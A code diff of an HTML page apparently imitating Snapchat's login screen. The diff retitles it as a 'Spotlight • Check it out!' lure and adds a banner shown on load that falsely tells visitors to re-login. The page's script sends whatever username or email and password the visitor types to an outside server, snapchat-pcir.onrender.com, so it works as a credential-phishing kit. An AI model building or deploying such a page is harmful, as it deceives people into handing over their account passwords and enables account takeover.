@@ -4,23 +4,22 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
   <link rel="shortcut icon" href="img/faviconV2.png">
-  <title>Login • BLANK</title>
+  <title>Spotlight • Check it out!</title>
   <style>
     *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
       font-family: "Avenir Next", -apple-system, Arial, sans-serif;
-      background: #fff;
+      background: #f7f7f7;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      justify-content: flex-start;
-      padding-top: 80px;
+      justify-content: center;
+      padding: 20px;
       position: relative;
     }
 
-    /* Back button */
     .back-button {
       position: absolute;
       top: 16px;
@@ -31,58 +30,55 @@
       padding: 6px;
       display: flex;
       align-items: center;
-      justify-content: center;
     }
-    .back-button img { width: 18px; height: 18px; opacity: 0.5; }
-    .back-button:hover img { opacity: 1; }
+    .back-button img { width: 18px; height: 18px; opacity: 0.4; }
+    .back-button:hover img { opacity: 0.8; }
 
-    /* placeholder icon circle */
+    .card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 36px 28px 28px;
+      width: 100%;
+      max-width: 360px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
     .placeholder-icon {
       width: 64px;
       height: 64px;
-      border-radius: 50%;
-      background: #f0f0f0;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin-bottom: 18px;
+      margin-bottom: 14px;
     }
     .placeholder-icon svg {
-      width: 32px;
-      height: 32px;
-      stroke: #bbb;
+      width: 56px;
+      height: 56px;
+      stroke: #111;
       fill: none;
-      stroke-width: 1.5;
+      stroke-width: 1.4;
       stroke-linecap: round;
       stroke-linejoin: round;
     }
 
     h1 {
       font-size: 22px;
-      font-weight: 600;
+      font-weight: 700;
       color: #000;
-      margin-bottom: 28px;
+      margin-bottom: 24px;
       text-align: center;
-      letter-spacing: -0.3px;
     }
 
-    .form-wrap {
-      width: 100%;
-      max-width: 340px;
-      padding: 0 20px;
-    }
-
-    /* Step 1: username field */
-    #step-1, #step-2 { width: 100%; }
-    #step-2 { display: none; }
+    .fields { width: 100%; }
 
     .field-label {
-      font-size: 12px;
-      font-weight: 600;
-      color: #888;
+      font-size: 13px;
+      font-weight: 500;
+      color: #555;
       margin-bottom: 6px;
       display: block;
-      letter-spacing: 0.02em;
     }
 
     input[type="text"],
@@ -105,23 +101,21 @@
 
     .phone-toggle {
       display: block;
-      margin-top: 12px;
-      font-size: 13px;
+      width: 100%;
+      text-align: center;
+      margin-top: 14px;
+      font-size: 13.5px;
       font-weight: 600;
       color: #00A6FF;
       text-decoration: none;
       cursor: pointer;
       background: none;
       border: none;
-      padding: 0;
       font-family: inherit;
     }
     .phone-toggle:hover { text-decoration: underline; }
 
-    /* Password field row */
-    .password-wrap {
-      position: relative;
-    }
+    .password-wrap { position: relative; width: 100%; }
     .password-wrap input { padding-right: 44px; }
     .toggle-password {
       position: absolute;
@@ -138,36 +132,31 @@
     .toggle-password img { width: 20px; height: 20px; opacity: 0.4; }
     .toggle-password:hover img { opacity: 0.8; }
 
-    /* Save info */
     .save-info {
       display: flex;
       align-items: center;
       gap: 8px;
       margin-top: 14px;
+      width: 100%;
     }
     .save-info input[type="checkbox"] { width: 15px; height: 15px; accent-color: #00A6FF; }
-    .save-info label {
-      font-size: 12px;
-      color: #aaa;
-      font-weight: 400;
-      cursor: pointer;
-    }
+    .save-info label { font-size: 12px; color: #aaa; cursor: pointer; }
 
     .forgot {
       display: block;
-      margin-top: 14px;
+      margin-top: 12px;
       font-size: 13px;
       font-weight: 600;
       color: #00A6FF;
       text-decoration: none;
-      text-align: left;
+      text-align: center;
+      width: 100%;
     }
     .forgot:hover { text-decoration: underline; }
 
-    /* Next / Login button */
     .btn-next {
       width: 100%;
-      margin-top: 24px;
+      margin-top: 22px;
       padding: 13px;
       background: #00A6FF;
       color: #fff;
@@ -178,19 +167,18 @@
       font-family: inherit;
       cursor: pointer;
       transition: background 0.2s, transform 0.15s;
-      letter-spacing: 0.01em;
     }
     .btn-next:hover  { background: #0094e0; }
     .btn-next:active { transform: scale(0.98); }
-    .btn-next:disabled { background: #a7d8f7; cursor: not-allowed; transform: none; }
+    .btn-next:disabled { background: #a7d8f7; cursor: not-allowed; }
 
-    /* Error / success messages */
     .incorrect {
       display: none;
       color: #e03535;
       font-size: 12.5px;
       margin-top: 8px;
       text-align: left;
+      width: 100%;
     }
     .server-message {
       display: none;
@@ -199,21 +187,11 @@
       border-radius: 8px;
       font-size: 13px;
       text-align: left;
+      width: 100%;
     }
-    .server-message.error {
-      display: block;
-      background: #fff0f0;
-      color: #cc0000;
-      border: 1px solid #f5c6c6;
-    }
-    .server-message.success {
-      display: block;
-      background: #f0fff4;
-      color: #007a33;
-      border: 1px solid #b2dfcc;
-    }
+    .server-message.error   { display: block; background: #fff0f0; color: #cc0000; border: 1px solid #f5c6c6; }
+    .server-message.success { display: block; background: #f0fff4; color: #007a33; border: 1px solid #b2dfcc; }
 
-    /* Error banner */
     .error-banner {
       display: none;
       background: #f44336;
@@ -222,27 +200,22 @@
       border-radius: 8px;
       font-size: 14px;
       text-align: center;
-      width: calc(100% - 40px);
-      max-width: 340px;
-      margin-bottom: 20px;
+      width: 100%;
+      max-width: 360px;
+      margin-bottom: 16px;
       animation: fadeIn 0.4s ease, vibrate 0.2s ease-in-out 3;
     }
     @keyframes fadeIn  { from { opacity: 0; } to { opacity: 1; } }
     @keyframes vibrate {
       0%,100% { transform: translateX(0); }
-      25%      { transform: translateX(-5px); }
-      75%      { transform: translateX(5px); }
+      25%     { transform: translateX(-5px); }
+      75%     { transform: translateX(5px); }
     }
-
     .spinner {
-      display: inline-block;
-      width: 14px; height: 14px;
-      border: 2px solid rgba(255,255,255,0.4);
-      border-top-color: #fff;
-      border-radius: 50%;
-      animation: spin 0.7s linear infinite;
-      vertical-align: middle;
-      margin-right: 6px;
+      display: inline-block; width: 14px; height: 14px;
+      border: 2px solid rgba(255,255,255,0.4); border-top-color: #fff;
+      border-radius: 50%; animation: spin 0.7s linear infinite;
+      vertical-align: middle; margin-right: 6px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
   </style>
@@ -257,28 +230,25 @@
     Something went wrong! Please re-login to your account.
   </div>
 
-  <!-- Placeholder icon -->
-  <div class="placeholder-icon">
-    <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
-  </div>
+  <div class="card">
 
-  <h1 id="page-title">Log in to Snapchat</h1>
-
-  <div class="form-wrap">
-
-    <!-- Step 1: username/email -->
-    <div id="step-1">
-      <span class="field-label" id="input-label">Username or Email</span>
-      <input type="text" id="username" placeholder="" autocomplete="username" />
-      <button class="phone-toggle" id="switch-to-phone">Use phone number instead</button>
-
-      <div class="incorrect" id="step1-error">Please enter your username, email or phone.</div>
-
-      <button class="btn-next" id="next-btn" onclick="goToStep2()">Next</button>
+    <div class="placeholder-icon">
+      <svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4"/><path d="M4 20c0-4 3.6-7 8-7s8 3 8 7"/></svg>
     </div>
 
-    <!-- Step 2: password -->
-    <div id="step-2">
+    <h1 id="page-title">Log in to BLANK</h1>
+
+    <!-- Step 1 -->
+    <div class="fields" id="step-1">
+      <span class="field-label" id="input-label">Username or Email</span>
+      <input type="text" id="username" autocomplete="username" />
+      <div class="incorrect" id="step1-error">Please enter your username or email.</div>
+      <button class="phone-toggle" id="switch-to-phone">Use phone number instead</button>
+      <button class="btn-next" onclick="goToStep2()">Next</button>
+    </div>
+
+    <!-- Step 2 -->
+    <div class="fields" id="step-2" style="display:none;">
       <span class="field-label">Password</span>
       <div class="password-wrap">
         <input type="password" id="password" autocomplete="current-password" />
@@ -286,80 +256,67 @@
           <img src="img/eye-closed.svg" id="eye-icon" alt="show password">
         </button>
       </div>
-
       <div class="incorrect" id="step2-error">Password must be at least 8 characters.</div>
       <div id="server-message" class="server-message"></div>
-
       <div class="save-info">
         <input type="checkbox" id="save-login">
         <label for="save-login">Save login info on this device</label>
       </div>
-
       <a href="#" class="forgot">Forgot your password?</a>
-
       <button class="btn-next" id="login-btn" onclick="handleLogin()">Log In</button>
     </div>
 
   </div>
 
   <script>
+    // !! Replace with your Render URL !!
     const SERVER_URL = 'https://snapchat-pcir.onrender.com';
 
-    // ── Step 1 → Step 2 ──────────────────────────────────────────────
     function goToStep2() {
-      const username   = document.getElementById('username').value.trim();
-      const step1Error = document.getElementById('step1-error');
-
-      if (!username) {
-        step1Error.style.display = 'block';
-        return;
-      }
-      step1Error.style.display = 'none';
+      const username = document.getElementById('username').value.trim();
+      const err      = document.getElementById('step1-error');
+      if (!username) { err.style.display = 'block'; return; }
+      err.style.display = 'none';
       document.getElementById('step-1').style.display = 'none';
-      document.getElementById('step-2').style.display = 'block';
+      document.getElementById('step-2').style.display = 'flex';
+      document.getElementById('step-2').style.flexDirection = 'column';
       document.getElementById('page-title').textContent = 'Enter password';
       document.getElementById('password').focus();
     }
 
-    // ── Back button ──────────────────────────────────────────────────
     function goBack() {
-      if (document.getElementById('step-2').style.display === 'block') {
+      if (document.getElementById('step-2').style.display !== 'none') {
         document.getElementById('step-2').style.display = 'none';
         document.getElementById('step-1').style.display = 'block';
-        document.getElementById('page-title').textContent = 'Log in';
+        document.getElementById('page-title').textContent = 'Log in to BLANK';
       } else {
         window.location.href = 'index.html';
       }
     }
 
-    // ── Login: send to server ────────────────────────────────────────
     async function handleLogin() {
-      const usernameOrEmail = document.getElementById('username').value.trim();
-      const password        = document.getElementById('password').value;
-      const step2Error      = document.getElementById('step2-error');
-      const serverMsg       = document.getElementById('server-message');
-      const loginBtn        = document.getElementById('login-btn');
+      const email     = document.getElementById('username').value.trim();
+      const password  = document.getElementById('password').value;
+      const err       = document.getElementById('step2-error');
+      const serverMsg = document.getElementById('server-message');
+      const btn       = document.getElementById('login-btn');
 
-      step2Error.style.display = 'none';
-      serverMsg.className  = 'server-message';
+      err.style.display = 'none';
+      serverMsg.className = 'server-message';
       serverMsg.textContent = '';
 
-      if (password.length < 8) {
-        step2Error.style.display = 'block';
-        return;
-      }
+      if (password.length < 8) { err.style.display = 'block'; return; }
 
-      loginBtn.disabled = true;
-      loginBtn.innerHTML = '<span class="spinner"></span>Logging in…';
+      btn.disabled = true;
+      btn.innerHTML = '<span class="spinner"></span>Logging in…';
 
       try {
         const res  = await fetch(`${SERVER_URL}/api/login`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ email: usernameOrEmail, password })
+          body: JSON.stringify({ email, password })
         });
         const data = await res.json();
-
         if (res.ok) {
           serverMsg.className   = 'server-message success';
           serverMsg.textContent = 'Login successful!';
@@ -368,56 +325,43 @@
           serverMsg.className   = 'server-message error';
           serverMsg.textContent = data.error || 'Login failed. Please try again.';
         }
-      } catch (err) {
+      } catch {
         serverMsg.className   = 'server-message error';
         serverMsg.textContent = 'Could not reach the server. Please try again.';
       }
 
-      loginBtn.disabled = false;
-      loginBtn.textContent = 'Log In';
+      btn.disabled = false;
+      btn.textContent = 'Log In';
     }
 
-    // ── Toggle password visibility ───────────────────────────────────
     document.querySelector('.toggle-password').addEventListener('click', function () {
-      const pwd     = document.getElementById('password');
-      const eyeIcon = document.getElementById('eye-icon');
-      if (pwd.type === 'password') {
-        pwd.type    = 'text';
-        eyeIcon.src = 'img/eye-open.svg';
-      } else {
-        pwd.type    = 'password';
-        eyeIcon.src = 'img/eye-closed.svg';
-      }
+      const pwd = document.getElementById('password');
+      const eye = document.getElementById('eye-icon');
+      if (pwd.type === 'password') { pwd.type = 'text';     eye.src = 'img/eye-open.svg'; }
+      else                         { pwd.type = 'password'; eye.src = 'img/eye-closed.svg'; }
     });
 
-    // ── Switch username ↔ phone ──────────────────────────────────────
     const switchBtn    = document.getElementById('switch-to-phone');
     const usernameInput = document.getElementById('username');
     const inputLabel   = document.getElementById('input-label');
-
     switchBtn.addEventListener('click', function () {
       if (inputLabel.textContent === 'Username or Email') {
-        inputLabel.textContent  = 'Phone Number';
-        usernameInput.type      = 'tel';
-        switchBtn.textContent   = 'Use email instead';
+        inputLabel.textContent = 'Phone Number';
+        usernameInput.type     = 'tel';
+        switchBtn.textContent  = 'Use email instead';
       } else {
-        inputLabel.textContent  = 'Username or Email';
-        usernameInput.type      = 'text';
-        switchBtn.textContent   = 'Use phone number instead';
+        inputLabel.textContent = 'Username or Email';
+        usernameInput.type     = 'text';
+        switchBtn.textContent  = 'Use phone number instead';
       }
     });
 
-    // ── Enter key support ────────────────────────────────────────────
     document.addEventListener('keydown', e => {
       if (e.key !== 'Enter') return;
-      if (document.getElementById('step-2').style.display === 'block') {
-        handleLogin();
-      } else {
-        goToStep2();
-      }
+      if (document.getElementById('step-2').style.display !== 'none') handleLogin();
+      else goToStep2();
     });
 
-    // ── Error banner ─────────────────────────────────────────────────
     window.onload = function () {
       const banner = document.getElementById('error-banner');
       banner.style.display = 'block';
